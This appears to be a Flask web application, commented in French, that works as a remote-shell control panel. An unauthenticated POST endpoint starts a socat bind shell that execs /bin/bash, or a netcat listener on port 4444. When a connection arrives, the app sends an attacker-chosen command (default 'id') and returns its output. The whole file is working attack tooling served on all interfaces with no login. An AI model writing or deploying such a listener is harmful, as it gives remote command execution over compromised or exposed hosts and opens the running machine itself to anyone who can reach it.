from flask import Flask, render_template, request, jsonify
import subprocess
import threading
import time
import shutil

app = Flask(__name__)

listener_thread = None
listener_active = False
listener_output = ""

def run_listener(port, command):
    global listener_active, listener_output
    listener_active = True
    try:
        listener_output = f"Recherche d'outil disponible... (port {port})"
        use_socat = shutil.which("socat") is not None
        use_nc = shutil.which("nc") is not None

        if use_socat:
            # socat lance un shell interactif, mais stdin n'est pas simple à manipuler ici
            cmd = ["socat", f"TCP4-LISTEN:{port},reuseaddr,fork", "EXEC:/bin/bash"]
            listener_output = f"[+] Listener lancé avec socat sur le port {port}..."
        elif use_nc:
            # netcat en mode écoute verbose, on peut envoyer des commandes via stdin
            cmd = ["bash", "-c", f"nc -lvnp {port}"]
            listener_output = f"[+] Listener lancé avec netcat sur le port {port}..."
        else:
            listener_output = "[-] Aucun outil (socat ou netcat) trouvé sur le système."
            listener_active = False
            return

        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        # On attend une ligne de sortie, qui indique la connexion entrante
        for _ in range(30):
            line = proc.stdout.readline()
            if line:
                listener_output += "\n[+] Connexion détectée ! Envoi de la commande..."
                break
            time.sleep(1)
        else:
            listener_output += "\n[-] Aucune connexion après 30 secondes."
            proc.kill()
            listener_active = False
            return

        # Avec netcat, on peut envoyer la commande; avec socat c'est plus compliqué (stdin non connecté)
        if use_nc:
            proc.stdin.write(command + "\n")
            proc.stdin.flush()

        # Lecture de la sortie de la commande
        output_lines = []
        for _ in range(10):
            line = proc.stdout.readline()
            if not line:
                break
            output_lines.append(line.strip())
            time.sleep(0.5)

        listener_output += f"\n[+] Résultat de `{command}` :\n" + "\n".join(output_lines)

    except Exception as e:
        listener_output = f"[!] Erreur : {str(e)}"
    finally:
        listener_active = False

@app.route("/")
def index():
    return render_template("index.html")  # ta page HTML doit gérer les appels AJAX

@app.route("/start_listener", methods=["POST"])
def start_listener():
    global listener_thread, listener_active
    if not listener_active:
        data = request.get_json(force=True)
        port = int(data.get("port", 4444))
        command = data.get("command", "id")
        listener_thread = threading.Thread(target=run_listener, args=(port, command))
        listener_thread.start()
        return jsonify({"status": f"Listener démarré sur le port {port}..."})
    else:
        return jsonify({"status": "Listener déjà actif."})

@app.route("/listener_status")
def listener_status():
    return jsonify({"status": listener_output})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
